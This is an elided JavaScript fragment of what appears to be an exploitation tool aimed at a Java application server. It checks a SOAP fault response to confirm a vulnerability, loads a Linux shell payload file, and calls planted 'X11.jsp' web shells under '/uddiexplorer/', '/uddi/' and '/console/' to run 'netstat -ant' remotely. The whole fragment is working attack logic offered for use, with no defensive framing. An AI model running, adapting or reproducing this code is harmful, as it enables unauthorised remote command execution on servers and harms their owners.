              ...
              if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
              {
                ...
                if(r.vul)
                {
                   ...
                   else if(s != s1_ && s1_)
                   {
                       ...
                       // all linux ok:
                       var s1_1 = _s.formatPayload(s1_, "payload/linuxShellX11.sh");
                       ...
                       // uddiexplorer
                       fnTmp1(aPath[0],s = s5,fCbk,'/uddiexplorer/X11.jsp?ls=netstat -ant');
                       fnTmp1(aPath[0],s = s5,fCbk,'/uddi/X11.jsp?ls=netstat -ant');
                       fnTmp1(aPath[0],s = s5,fCbk,'/console/X11.jsp?ls=netstat -ant');
